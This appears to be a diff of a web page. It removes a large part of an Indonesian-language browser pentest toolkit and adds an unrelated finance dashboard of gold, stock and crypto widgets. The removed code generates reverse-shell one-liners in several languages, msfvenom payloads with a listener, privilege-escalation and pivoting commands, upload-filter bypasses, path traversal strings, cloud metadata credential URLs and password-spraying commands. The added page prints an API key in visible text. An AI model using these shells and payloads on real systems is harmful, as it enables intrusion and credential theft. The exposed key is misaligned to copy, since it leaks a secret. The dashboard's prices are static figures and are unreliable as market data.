-reg('FUZZ','Param Wordlist','Generate wordlist parameter',async b=>{
-  var base=ask('Kata (;):','id;user;admin;debug;token;page;file;path;url;cmd');
-  var w=base.split(';').map(x=>x.trim()).filter(Boolean);
-  var out=[];w.forEach(x=>{out.push(x,x+'_id',x+'Id',x+'.json')});
-  var t=[...new Set(out)].join('\n');outBox(b,t);dload('param-wordlist.txt',t);bump()});
+                <div class="glass-card rounded-2xl p-5 hover:border-amber-500/60 transition shadow-xl relative overflow-hidden group">
+                    <div class="flex items-center justify-between mb-3">
+                        <span class="text-xs font-bold text-amber-500 uppercase tracking-wider flex items-center gap-1.5">
+                            <i class="fa-brands fa-bitcoin"></i> Bitcoin / USD
+                        </span>
+                        <span class="text-[10px] bg-slate-800 text-slate-300 px-2 py-0.5 rounded-md font-mono font-bold">TradingView</span>
+                    </div>
+                    <div class="text-2xl sm:text-3xl font-black text-white tracking-tight">$64,250.00</div>
+                    <div class="mt-2 flex items-center justify-between text-xs">
+                        <span class="text-emerald-400 font-bold"><i class="fa-solid fa-arrow-trend-up"></i> +$1,350 (+2.15%)</span>
+                        <span class="text-slate-400">Vol: $28.5B</span>
+                    </div>
+                </div>
 
-/* ---------- SHELL ---------- */
-reg('SHELL','Reverse Shell Generator','Multi-language one-liner (target berizin)',async b=>{
-  var ip=ask('IP listener (lu):','10.10.14.1'),port=ask('Port:','4444');
-  var o={'bash -i':'bash -i >& /dev/tcp/'+ip+'/'+port+' 0>&1',
-  'python':'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("'+ip+'",'+port+'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'',
-  'nc -e':'nc -e /bin/bash '+ip+' '+port,
-  'perl':'perl -e \'use Socket;$i="'+ip+'";$p='+port+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">S");open(STDOUT,">S");open(STDERR,">S");exec("/bin/sh -i");\'',
-  'php':'php -r \'$sock=fsockopen("'+ip+'",'+port+');exec("/bin/sh -i <&3 >&3 2>&3");\''};
-  var t='=== UNTUK PENGUJIAN BERIZIN ===\n\nListener: nc -lvnp '+port+'\n\n'+Object.keys(o).map(k=>'== '+k+' ==\n'+o[k]).join('\n\n');
-  outBox(b,t);dload('reverse-shells.txt',t);bump()});
-cheat('SHELL','TTY Upgrade Cheat','Upgrade shell dumb',async b=>{
-  outBox(b,`python -c 'import pty;pty.spawn("/bin/bash")'
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+            </div>
 
-Lalu Ctrl+Z di host lu:
-stty raw -echo; fg
-export TERM=xterm`);bump()});
-cheat('SHELL','MSFVenom Builder','Generate payload msfvenom',async b=>{
-  var ip=ask('LHOST:','10.10.14.1'),port=ask('LPORT:','4444');
-  outBox(b,[
-  'Windows : msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST='+ip+' LPORT='+port+' -f exe -o rev.exe',
-  'Linux   : msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST='+ip+' LPORT='+port+' -f elf -o rev.elf',
-  'PHP     : msfvenom -p php/meterpreter/reverse_tcp LHOST='+ip+' LPORT='+port+' -f raw -o rev.php',
-  'APK     : msfvenom -p android/meterpreter/reverse_tcp LHOST='+ip+' LPORT='+port+' -o rev.apk',
-  'Listener: msfconsole -q -x "use multi/handler; set LHOST '+ip+'; set LPORT '+port+'; run"'].join('\n'));bump()});
-cheat('SHELL','Linux Privesc Cheat','Checklist privesc Linux',async b=>{
-  outBox(b,`sudo -l
-find / -perm -4000 2>/dev/null   # SUID
-cat /etc/crontab
-find / -writable -type f 2>/dev/null
-uname -a → cek exploit kernel
-getcap -r / 2>/dev/null
-Tools: linpeas.sh, lse.sh, pspy`);bump()});
-cheat('SHELL','Windows Privesc Cheat','Checklist privesc Windows',async b=>{
-  outBox(b,`whoami /priv     # SeImpersonate → JuicyPotato
-whoami /groups
-schtasks /query /fo LIST /v
-wmic service get name,pathname,startmode | findstr /i "Auto"
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-Tools: winPEAS.exe, PowerUp.ps1`);bump()});
-cheat('SHELL','SSH Tunnel Cheat','Tunnel & pivoting',async b=>{
-  outBox(b,`Local  : ssh -L 8080:internal:80 user@pivot
-SOCKS  : ssh -D 9050 user@pivot
-Remote : ssh -R 9000:localhost:22 user@attacker
-Jump   : ssh -J jump1,jump2 user@final
-Chisel : chisel server -p 8000 --reverse  /  chisel client attacker:8000 R:socks`);bump()});
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                <!-- MARKET FEAR & GREED GAUGE -->
+                <div class="bg-slate-900 border border-slate-800 rounded-3xl p-5 shadow-xl space-y-3">
+                    <div class="flex items-center justify-between border-b border-slate-800 pb-2.5">
+                        <h3 class="font-extrabold text-sm text-white flex items-center gap-2">
+                            <i class="fa-solid fa-gauge-high text-amber-400"></i> Sentimen Pasar (Fear & Greed Index)
+                        </h3>
+                        <span class="text-[10px] bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded font-mono font-bold">OPTIMIS / GREED</span>
+                    </div>
+                    <div class="flex items-center justify-between pt-1">
+                        <div>
+                            <span class="text-3xl font-black text-emerald-400">68</span>
+                            <span class="text-xs text-slate-400 font-semibold"> / 100</span>
+                            <p class="text-xs text-slate-300 mt-1">Pasar berada dalam kondisi <strong>Greed (Tinggi Kepercayaan Diri)</strong></p>
+                        </div>
+                        <div class="w-36 h-12 relative flex items-center justify-center">
+                            <div class="w-full bg-slate-800 h-4 rounded-full overflow-hidden relative border border-slate-700">
+                                <div class="bg-gradient-to-r from-rose-500 via-amber-500 to-emerald-400 h-full w-[68%] rounded-full"></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="grid grid-cols-3 gap-2 text-[11px] pt-2 border-t border-slate-800/80">
+                        <div class="bg-slate-950 p-2 rounded-xl text-center"><span class="text-slate-400 block text-[10px]">Volatilitas</span><strong class="text-emerald-400">Rendah</strong></div>
+                        <div class="bg-slate-950 p-2 rounded-xl text-center"><span class="text-slate-400 block text-[10px]">Arus Asing</span><strong class="text-cyan-400">+Rp 850B</strong></div>
+                        <div class="bg-slate-950 p-2 rounded-xl text-center"><span class="text-slate-400 block text-[10px]">Emas Safe Haven</span><strong class="text-amber-400">Tinggi</strong></div>
+                    </div>
+                </div>
 
-/* ---------- PAYLOAD ---------- */
-cheat('PAYLOAD','File Upload Bypass','Bypass upload filter',async b=>{
-  outBox(b,`shell.php → .php5 .phtml .phar .php;.jpg .jpg.php
-MIME      : Content-Type: image/jpeg + body PHP
-Magic     : \\xFF\\xD8\\xFF di awal (GIF89a juga)
-Null byte : shell.php%00.jpg (PHP lama)
-Double ext: shell.php.jpg
-.htaccess : AddType application/x-httpd-php .jpg`);bump()});
-cheat('PAYLOAD','Path Traversal Cheat','Traversal paths',async b=>{
-  outBox(b,`../../../etc/passwd
-..\\/..\\/..\\/etc\\/passwd
-%2e%2e%2f%2e%2e%2fetc%2fpasswd
-....//....//....//etc/passwd
-/etc/passwd%00.jpg
-php://filter/read=convert.base64-encode/resource=/etc/passwd
-Windows: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`);bump()});
-cheat('PAYLOAD','Cloud Attack Cheat','Risiko cloud (audit milik lu)',async b=>{
-  outBox(b,`S3     : aws s3 ls s3://bucket --no-sign-request
-EC2    : http://169.254.169.254/latest/meta-data/iam/security-credentials/
-GCP    : http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
-Azure  : http://169.254.169.254/metadata/instance?api-version=2021-02-01
-Tool   : pacu, prowler`);bump()});
-cheat('PAYLOAD','Password Spray Cheat','Password spraying (lab AD lu)',async b=>{
-  outBox(b,`kerbrute userenum --dc DC -d domain users.txt
-crackmapexec smb DC -u users.txt -p 'Summer2024!' --continue-on-success
-hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule`);bump()});
+                <!-- INSTANT FX & SAR RIYAL CONVERTER WIDGET -->
+                <div class="bg-slate-900 border border-slate-800 rounded-3xl p-5 shadow-xl space-y-3">
+                    <div class="flex items-center justify-between border-b border-slate-800 pb-2.5">
+                        <h3 class="font-extrabold text-sm text-white flex items-center gap-2">
+                            <i class="fa-solid fa-right-left text-cyan-400"></i> Kalkulator Valas & Emas Multimata Uang
+                        </h3>
+                        <span class="text-[10px] bg-cyan-500/20 text-cyan-300 px-2 py-0.5 rounded font-mono font-bold">REALTIME FX</span>
+                    </div>
+                    <div class="grid grid-cols-2 gap-3 text-xs">
+                        <div>
+                            <label class="text-[11px] text-slate-400 block mb-1 font-semibold">Jumlah Gram Emas</label>
+                            <input type="number" id="convGramInput" value="1" oninput="runAssetConverter('gram')" class="w-full bg-slate-950 border border-slate-700 rounded-xl p-2.5 font-bold text-amber-400 focus:outline-none focus:border-amber-500">
+                        </div>
+                        <div>
+                            <label class="text-[11px] text-slate-400 block mb-1 font-semibold">Rupiah (IDR)</label>
+                            <input type="number" id="convIdrInput" value="1485000" oninput="runAssetConverter('idr')" class="w-full bg-slate-950 border border-slate-700 rounded-xl p-2.5 font-bold text-white focus:outline-none focus:border-amber-500">
+                        </div>
+                    </div>
+                    <div class="grid grid-cols-3 gap-2 text-xs bg-slate-950 p-2.5 rounded-xl border border-slate-800 text-center">
+                        <div><span class="text-slate-400 text-[10px] block">USD:</span> <strong class="text-emerald-400" id="convUsdResult">$96.30</strong></div>
+                        <div><span class="text-slate-400 text-[10px] block">Riyal SAR:</span> <strong class="text-amber-300" id="convSarResult">361.1 SAR</strong></div>
+                        <div><span class="text-slate-400 text-[10px] block">BTC:</span> <strong class="text-amber-400" id="convBtcResult">0.0015 BTC</strong></div>
+                    </div>
+                </div>
+            </div>
 
-/* ---------- CRYPTO ---------- */
-reg('CRYPTO','Multi Hasher','MD5/SHA1/SHA256/SHA512/SHA3',async b=>{
-  var t=prompt('Teks:');if(t==null)return;
-  outBox(b,'MD5    : '+CryptoJS.MD5(t)+'\nSHA1   : '+CryptoJS.SHA1(t)+'\nSHA256 : '+CryptoJS.SHA256(t)+'\nSHA512 : '+CryptoJS.SHA512(t)+'\nSHA3   : '+CryptoJS.SHA3(t));bump()});
-reg('CRYPTO','HMAC Generator','HMAC-SHA256',async b=>{
-  var m=prompt('Message:'),k=prompt('Key:');if(m==null||!k)return;
-  var enc=new TextEncoder();
-  var key=await crypto.subtle.importKey('raw',enc.encode(k),{name:'HMAC',hash:'SHA-256'},false,['sign']);
-  var sig=await crypto.subtle.sign('HMAC',key,enc.encode(m));
-  outBox(b,[...new Uint8Array(sig)].map(x=>x.toString(16).padStart(2,'0')).join(''));bump()});
-reg('CRYPTO','AES Encrypt/Decrypt','AES-256 passphrase-based',async b=>{
-  var mode=ask('Mode (e/d):','e');
-  var t=prompt(mode==='e'?'Plaintext:':'Ciphertext:');if(t==null)return;
-  var k=prompt('Passphrase:');if(!k)return;
-  try{if(mode==='e')outBox(b,CryptoJS.AES.encrypt(t,k).toString());
-  else outBox(b,CryptoJS.AES.decrypt(t,k).toString(CryptoJS.enc.Utf8)||'(gagal)')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-reg('CRYPTO','File Hasher','SHA-256 file lokal',async b=>{
-  var inp=document.createElement('input');inp.type='file';
-  inp.onchange=()=>{var f=inp.files[0];if(!f)return;
-  var fr=new FileReader();fr.onload=()=>{
-  crypto.subtle.digest('SHA-256',fr.result).then(h=>{
-  outBox(b,'File   : '+f.name+'\nSize   : '+f.size+'\nSHA-256: '+[...new Uint8Array(h)].map(x=>x.toString(16).padStart(2,'0')).join(''))})};
-  fr.readAsArrayBuffer(f)};inp.click();bump()});
-reg('CRYPTO','Password Auditor','Entropy + estimasi crack',async b=>{
-  var p=prompt('Password:');if(!p)return;
-  var pool=0;if(/[a-z]/.test(p))pool+=26;if(/[A-Z]/.test(p))pool+=26;if(/\d/.test(p))pool+=10;if(/[^a-zA-Z0-9]/.test(p))pool+=32;
-  var ent=p.length*Math.log2(pool||1);
-  outBox(b,'Panjang : '+p.length+'\nPool    : '+pool+'\nEntropy : '+ent.toFixed(1)+' bits\nCrack   : '+(Math.pow(2,ent)/1e10/31536000).toFixed(1)+' tahun (10GH/s)')});
-reg('CRYPTO','Caesar/ROT Decoder','Decode ROT semua shift',async b=>{
-  var t=prompt('Ciphertext:');if(!t)return;
-  var o='';for(var s=1;s<26;s++)o+='ROT'+s+': '+t.replace(/[a-z]/gi,c=>{var b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+s)%26+b)})+'\n';
-  outBox(b,o);bump()});
+            <!-- HISTORICAL GOLD PRICE CHART (CHART.JS) -->
+            <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl space-y-4">
+                <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+                    <div>
+                        <h3 class="font-extrabold text-base text-white flex items-center gap-2">
+                            <i class="fa-solid fa-chart-line text-amber-400"></i> Historis Tren Harga Emas Batangan (Chart.js Interactive)
+                        </h3>
+                        <p class="text-xs text-slate-400">Pergerakan estimasi harga emas Antam per gram dalam Rupiah</p>
+                    </div>
+                    <div class="flex gap-2">
+                        <button onclick="updateChartTimeframe('7d')" id="btnChart7d" class="px-3 py-1.5 bg-amber-500 text-slate-950 font-bold rounded-xl text-xs transition">7 Hari</button>
+                        <button onclick="updateChartTimeframe('30d')" id="btnChart30d" class="px-3 py-1.5 bg-slate-800 text-slate-300 font-bold rounded-xl text-xs hover:text-white transition">30 Hari</button>
+                        <button onclick="updateChartTimeframe('1y')" id="btnChart1y" class="px-3 py-1.5 bg-slate-800 text-slate-300 font-bold rounded-xl text-xs hover:text-white transition">1 Tahun</button>
+                    </div>
+                </div>
 
-/* ---------- ENCODE ---------- */
-reg('ENCODE','Multi Encoder','Base64/Hex/URL',async b=>{
-  var t=prompt('Teks:');if(t==null)return;
-  var b64=btoa(unescape(encodeURIComponent(t)));
-  outBox(b,'Base64 : '+b64+'\nBase64URL: '+b64.replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'')+'\nHex    : '+CryptoJS.enc.Hex.stringify(CryptoJS.enc.Utf8.parse(t))+'\nURL    : '+encodeURIComponent(t));bump()});
-reg('ENCODE','Base64 Decoder','Decode base64',async b=>{
-  var t=prompt('Base64:');if(t==null)return;
-  try{var s=t.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';
-  outBox(b,decodeURIComponent(escape(atob(s))))}catch(e){outBox(b,'INVALID')}bump()});
-reg('ENCODE','Hex Decoder','Decode hex',async b=>{
-  var t=prompt('Hex:');if(!t)return;
-  try{outBox(b,t.replace(/[^0-9a-f]/gi,'').match(/../g).map(x=>String.fromCharCode(parseInt(x,16))).join(''))}catch(e){outBox(b,'ERR')}bump()});
-reg('ENCODE','URL Decoder','Multi-layer URL decode',async b=>{
-  var t=prompt('URL-encoded:');if(!t)return;
-  var o=t,l=t;for(var i=0;i<5;i++){l=decodeURIComponent(l);if(l===o)break;o=l}
-  outBox(b,'Layer 0: '+t+'\nDecoded: '+l);bump()});
+                <div class="w-full h-64 sm:h-80 bg-slate-950 rounded-2xl p-3 border border-slate-800 relative">
+                    <canvas id="goldChartCanvas"></canvas>
+                </div>
+            </div>
 
-/* ---------- NET ---------- */
-reg('NET','TCP Port Checker','Cek port HTTP (indikatif)',async b=>{
-  var host=ask('Host:','example.com'),port=ask('Port:','80');
-  var ctl=new AbortController();setTimeout(()=>ctl.abort(),4000);
-  var t0=performance.now();var st;
-  try{await fetch('http://'+host+':'+port,{mode:'no-cors',signal:ctl.signal,cache:'no-store'});st='✔ MUNGKIN OPEN'}
-  catch(e){st=e.name==='AbortError'?'⚠ TIMEOUT':e.message}
-  outBox(b,host+':'+port+' → '+st+'\n\n⚠ Untuk scan nyata pakai nmap di Kali.');bump()});
-reg('NET','Port Sweep (HTTP)','Cek beberapa port HTTP',async b=>{
-  var host=ask('Host:','example.com');if(!host)return;
-  var ports=[80,443,8080,8443,8000,8888,3000,5000];
-  var o='';
-  for(var p of ports){var ctl=new AbortController();setTimeout(()=>ctl.abort(),3000);
-  try{await fetch('http'+(p===443||p===8443?'s':'')+'://'+host+':'+p,{mode:'no-cors',signal:ctl.signal,cache:'no-store'});o+=':'+p+' ✔\n'}catch(e){o+=':'+p+' —\n'}}
-  outBox(b,o+'\nKonfirmasi: nmap -sV -p 80,443,8080,8443 '+host);bump()});
-reg('NET','MAC Vendor Lookup','Lookup vendor MAC',async b=>{
-  var m=ask('MAC:','');if(!m)return;
-  try{var r=await fetch('https://api.macvendors.com/'+encodeURIComponent(m));
-  outBox(b,m+' → '+await r.text())}catch(e){outBox(b,'ERR/limit')}bump()});
+            <!-- TOP MOVERS STOCK SCREENER SECTION -->
+            <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl space-y-4">
+                <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-3">
+                    <div>
+                        <h3 class="font-extrabold text-base text-white flex items-center gap-2">
+                            <i class="fa-solid fa-chart-pie text-emerald-400"></i> Screener Saham Top Movers IHSG (GoAPI Feed)
+                        </h3>
+                        <p class="text-xs text-slate-400">Saham paling aktif dan pergerakan persentase tertinggi hari ini</p>
+                    </div>
+                    <div class="flex gap-2">
+                        <button onclick="toggleStockScreener('gainers')" id="btnScreenerGainers" class="px-3 py-1.5 bg-emerald-500 text-slate-950 font-bold rounded-xl text-xs shadow-md transition">Top Gainers</button>
+                        <button onclick="toggleStockScreener('losers')" id="btnScreenerLosers" class="px-3 py-1.5 bg-slate-800 text-slate-400 font-bold rounded-xl text-xs hover:text-white transition">Top Losers</button>
+                    </div>
+                </div>
 
-/* ---------- DEVICE ---------- */
-reg('DEVICE','Fingerprint','Info browser & perangkat',async b=>{
-  var inf={ua:navigator.userAgent,lang:navigator.language,cores:navigator.hardwareConcurrency,screen:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone};
-  outBox(b,Object.keys(inf).map(k=>k.padEnd(8)+': '+inf[k]).join('\n'));bump()});
-reg('DEVICE','Battery & Network','Baterai & koneksi',async b=>{
-  var o='Network: '+(navigator.connection?navigator.connection.effectiveType:'n/a')+'\n';
-  if(navigator.getBattery)navigator.getBattery().then(x=>outBox(b,o+'Battery: '+Math.round(x.level*100)+'%'));
-  else outBox(b,o+'Battery API tidak didukung');bump()});
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left text-xs text-slate-300">
+                        <thead class="bg-slate-950 uppercase font-bold text-slate-400 border-b border-slate-800">
+                            <tr>
+                                <th class="py-3 px-4">Kode / Nama Saham</th>
+                                <th class="py-3 px-4">Harga Penutupan</th>
+                                <th class="py-3 px-4">Perubahan (%)</th>
+                                <th class="py-3 px-4">Volume Transaksi</th>
+                                <th class="py-3 px-4">Aksi Charting</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-slate-800/60" id="stockScreenerBody">
+                            <!-- Populated dynamically via JS -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
 
-/* ---------- MISC ---------- */
-reg('MISC','QR Generator','QR + download PNG',async b=>{
-  var t=prompt('Teks/URL:');if(t==null)return;
-  var c=document.createElement('canvas');
-  QRCode.toCanvas(c,t,{width:280,color:{dark:'#00ff41',light:'#000'}},function(err){
-  if(err){outBox(b,'ERR: '+err);return}
-  var box=outBox(b,'');c.style.maxWidth='100%';box.appendChild(c);
-  var a=document.createElement('a');a.download='qr.png';a.href=c.toDataURL();a.textContent='⬇ Download PNG';a.style.cssText='display:block;margin-top:8px;color:#00ff41';box.appendChild(a)});bump()});
-reg('MISC','JSON Formatter','Beautify & validate',async b=>{
-  var t=prompt('JSON:');if(t==null)return;
-  try{outBox(b,JSON.stringify(JSON.parse(t),null,2))}catch(e){outBox(b,'INVALID: '+e.message)}bump()});
-reg('MISC','Regex Tester','Uji regex',async b=>{
-  var re=prompt('Regex:','^[a-z]+@[a-z]+\\.[a-z]{2,}$');if(re==null)return;
-  var s=prompt('Teks:','admin@example.com');if(s==null)return;
-  try{var r=new RegExp(re,'g'),m=[],x;while((x=r.exec(s))!==null){m.push(x[0]+' @ '+x.index);if(!r.global)break}
-  outBox(b,'Regex : '+re+'\nMatch : '+(m.length?m.join('\n        '):'✘'))}catch(e){outBox(b,'INVALID')}bump()});
-reg('MISC','Token Generator','Token crypto-secure',async b=>{
-  var len=parseInt(ask('Panjang:','32'))||32,n=parseInt(ask('Jumlah:','5'))||5;
-  var cs='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-  var o=[];for(var i=0;i<n;i++){var a=new Uint32Array(len);crypto.getRandomValues(a);o.push(Array.from(a).map(x=>cs[x%cs.length]).join(''))}
-  outBox(b,o.join('\n'));bump()});
-reg('MISC','UUID Generator','UUID v4',async b=>{
-  var n=parseInt(ask('Jumlah:','5'))||5;var o=[];
-  for(var i=0;i<n;i++)o.push(crypto.randomUUID());
-  outBox(b,o.join('\n'));bump()});
-reg('MISC','Wordlist Generator','Wordlist kustom',async b=>{
-  var base=ask('Kata (;):','admin;root;test'),year=ask('Tahun:','2024');
-  var w=base.split(';').map(x=>x.trim()).filter(Boolean);var out=new Set();
-  w.forEach(x=>{out.add(x,x+'123',x+'!',x+'@'+year,x+year,x.toUpperCase())});
-  var t=[...out].join('\n');outBox(b,t);dload('wordlist.txt',t);bump()});
-reg('MISC','Timestamp Converter','Unix ↔ tanggal',async b=>{
-  var t=prompt('Unix (kosong = now):','')||Math.floor(Date.now()/1000);
-  outBox(b,'Unix   : '+t+'\nTanggal: '+new Date(parseInt(t)*1000).toLocaleString('id-ID'));bump()});
-reg('MISC','Session Export','Export data lokal ke JSON',async b=>{
-  var d={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);d[k]=localStorage.getItem(k)}
-  var s=JSON.stringify(d,null,2);outBox(b,s);dload('m4zk-session-'+Date.now()+'.json',s);bump()});
+            <!-- DASHBOARD NEWS CATEGORY GRID -->
+            <div class="space-y-4 pt-2">
+                <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-3">
+                    <h2 class="text-lg font-black text-white flex items-center gap-2">
+                        <i class="fa-solid fa-cubes text-cyan-400"></i> Jelajah Berita Berdasarkan Sektor
+                    </h2>
+                    <div class="flex flex-wrap gap-2" id="newsCategoryFilters">
+                        <button onclick="filterNewsCategory('all')" class="cat-btn px-3 py-1.5 rounded-xl text-xs font-bold bg-amber-500 text-slate-950 shadow">Semua</button>
+                        <button onclick="filterNewsCategory('saham')" class="cat-btn px-3 py-1.5 rounded-xl text-xs font-bold bg-slate-800 text-slate-300 hover:text-white transition">Saham & IHSG</button>
+                        <button onclick="filterNewsCategory('emas')" class="cat-btn px-3 py-1.5 rounded-xl text-xs font-bold bg-slate-800 text-slate-300 hover:text-white transition">Emas & Komoditas</button>
+                        <button onclick="filterNewsCategory('kripto')" class="cat-btn px-3 py-1.5 rounded-xl text-xs font-bold bg-slate-800 text-slate-300 hover:text-white transition">Kripto & Web3</button>
+                    </div>
+                </div>
 
-/* ---------- REPORT ---------- */
-reg('REPORT','Pentest Report Builder','Laporan markdown + download',async b=>{
-  var target=ask('Target:','example.com');
-  var f=(ask('Temuan (;):','Exposed .env; Weak CSP')||'').split(';').filter(Boolean);
-  var md='# Laporan — M4zk1pL4y ToolS v10.0\n\n**Target:** '+target+'\n**Tanggal:** '+new Date().toISOString()+'\n\n## Temuan\n'+f.map((x,i)=>(i+1)+'. '+x.trim()+' [severity: ___]\n   - Endpoint:\n   - PoC:\n   - Rekomendasi:').join('\n');
-  outBox(b,md);dload('laporan-'+target.replace(/\W+/g,'-')+'.md',md);bump()});
-reg('REPORT','CVSS Calculator','CVSS v3.1 base score',async b=>{
-  var av=ask('AV (N/L/A/P):','N'),ac=ask('AC (L/H):','L');
-  var pr=ask('PR (N/L/H):','N'),ui=ask('UI (N/R):','N');
-  var s=ask('S (U/C):','U'),c=ask('C (H/L/N):','H'),i=ask('I (H/L/N):','H'),a=ask('A (H/L/N):','H');
-  var W={AV:{N:.85,L:.55,A:.62,P:.2},AC:{L:.77,H:.44},PR:{U:{N:.85,L:.62,H:.27},C:{N:.85,L:.68,H:.27}},UI:{N:.85,R:.62},C:{H:.56,L:.22,N:0},I:{H:.56,L:.22,N:0},A:{H:.56,L:.22,N:0}};
-  try{var iss=1-(1-W.C[c])*(1-W.I[i])*(1-W.A[a]);
-  var imp=s==='C'?7.52*(iss-.029)-3.25*Math.pow(iss-.02,15):6.42*iss;
-  var exp=8.22*W.AV[av]*W.AC[ac]*W.PR[s][pr]*W.UI[ui];
-  var sc=imp<=0?0:(s==='C'?1.08*(imp+exp):Math.min(1.08*(imp+exp),10)).toFixed(1);
-  var sev=sc>=9?'Critical':sc>=7?'High':sc>=4?'Medium':sc>0?'Low':'None';
-  outBox(b,'CVSS: '+sc+' ('+sev+')\nVector: CVSS:3.1/AV:'+av+'/AC:'+ac+'/PR:'+pr+'/UI:'+ui+'/S:'+s+'/C:'+c+'/I:'+i+'/A:'+a)}catch(e){outBox(b,'ERR')}bump()});
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6" id="mainNewsGrid">
+                    <!-- Populated via JS -->
+                </div>
+            </div>
 
-}catch(e){console.error(e);toast('[ERR modul] '+e.message,1)}
-</script>
+        </div>
 
-<script>
-/* ================= RENDER ================= */
-var CATS=['ALL','API-ID','RECON','NMAP','NUCLEI','OSINT','DORK','WEB','SQLI','XSS','FUZZ','SHELL','PAYLOAD','CRYPTO','ENCODE','NET','DEVICE','MISC','REPORT'];
-var curCat='ALL',curQ='';
-function renderNav(){$('nav').innerHTML=CATS.map(c=>'<div class="tab'+(c===curCat?' act':'')+'" onclick="openCat(\''+c+'\')">'+c+'</div>').join('')}
-function openCat(c){curCat=c;renderNav();renderGrid()}
-function renderGrid(){var q=curQ.toLowerCase();
-  var list=TOOLS.filter(t=>(curCat==='ALL'||t.cat===curCat)&&(!q||(t.name+t.desc).toLowerCase().includes(q)));
-  $('grid').innerHTML=list.length?list.map(t=>'<div class="card" onclick="runTool('+TOOLS.indexOf(t)+')"><h3>['+t.cat+'] '+esc(t.name)+'</h3><p>'+esc(t.desc)+'</p></div>').join(''):'<div class="card"><h3>[!] Tidak ada hasil</h3></div>';
-  $('st-mod').textContent=TOOLS.length}
-$('search').addEventListener('input',e=>{curQ=e.target.value;renderGrid()});
-$('search').addEventListener('keydown',e=>{if(e.key==='Enter'){var t=TOOLS.find(t=>(t.name+t.desc).toLowerCase().includes(curQ.toLowerCase()));if(t)runTool(TOOLS.indexOf(t))}});
-addEventListener('keydown',e=>{if((e.ctrlKey||e.metaKey)&&e.key==='k'){e.preventDefault();$('search').focus()}if(e.key==='Escape')closeModal()});
+        <!-- ================= TAB 2: HARGA EMAS LIVE (EMAS MAULANA API) ================= -->
+        <div id="tab-emas" class="tab-content hidden space-y-8">
+            
+            <div class="bg-gradient-to-r from-amber-950/60 via-slate-900 to-amber-900/40 border border-amber-500/40 rounded-3xl p-6 sm:p-8 shadow-2xl space-y-4 relative overflow-hidden">
+                <div class="flex flex-col md:flex-row items-start md:items-center justify-between gap-6">
+                    <div>
+                        <div class="flex items-center gap-2 text-xs text-amber-400 font-bold uppercase tracking-wider">
+                            <i class="fa-solid fa-coins"></i> TERINTEGRASI REST API EMAS MAULANA
+                        </div>
+                        <h2 class="text-2xl sm:text-3xl font-black text-white mt-1">Pusat Informasi & Harga Emas Batangan Antam Realtime</h2>
+                        <p class="text-xs sm:text-sm text-slate-300 mt-1 max-w-2xl">
+                            Diperbarui langsung dari sistem Emas Maulana API (Key: <code class="bg-slate-950 px-2 py-0.5 rounded text-amber-300 font-mono font-bold">fd02b7ac-465b-40b9-b5fc-b9c81e1aac3f</code>) sesuai harga resmi Butik Logam Mulia.
+                        </p>
+                    </div>
+                    <div class="bg-slate-950/80 border border-amber-500/40 p-5 rounded-2xl text-left md:text-right shrink-0 w-full md:w-auto shadow-inner">
+                        <div class="text-xs text-slate-400 font-semibold">Harga Beli Dasar (1 Gram)</div>
+                        <div class="text-3xl sm:text-4xl font-black text-amber-400 tracking-tight" id="goldMaulanaPriceMain">Rp 1.485.000</div>
+                        <div class="text-xs text-emerald-400 mt-1 font-bold"><i class="fa-solid fa-circle-up"></i> Naik Rp 6.000 (0.40%) dari kemarin</div>
+                    </div>
+                </div>
+            </div>
 
-/* ================= DISCLAIMER + MUSIK ================= */
-var _cd=5,_iv=setInterval(()=>{--_cd;var el=$('cd');if(el)el.textContent=_cd;if(_cd<=0)clearInterval(_iv)},1000);
-setTimeout(mzkEnter,5000);
-function mzkEnter(){clearInterval(_iv);var d=$('disclaimer');if(d)d.remove();mzkStartMusic()}
-function mzkStartMusic(){var a=$('bgm');if(!a)return;a.volume=.35;
-  var p=a.play();
-  if(p)p.catch(()=>{var go=()=>{a.play().catch(()=>{});removeEventListener('click',go);removeEventListener('keydown',go)};
-  addEventListener('click',go);addEventListener('keydown',go)})}
-function mzkMute(){var a=$('bgm');a.muted=!a.muted;$('mzkMute').textContent=a.muted?'🔇':'🔊'}
+            <!-- NEW BRAND COMPARISON MATRIX -->
+            <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl space-y-4">
+                <h3 class="font-extrabold text-base text-white flex items-center gap-2 border-b border-slate-800 pb-3">
+                    <i class="fa-solid fa-scale-balanced text-amber-400"></i> Matriks Perbandingan Harga Brand Emas Batangan Indonesia
+                </h3>
+                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 text-xs">
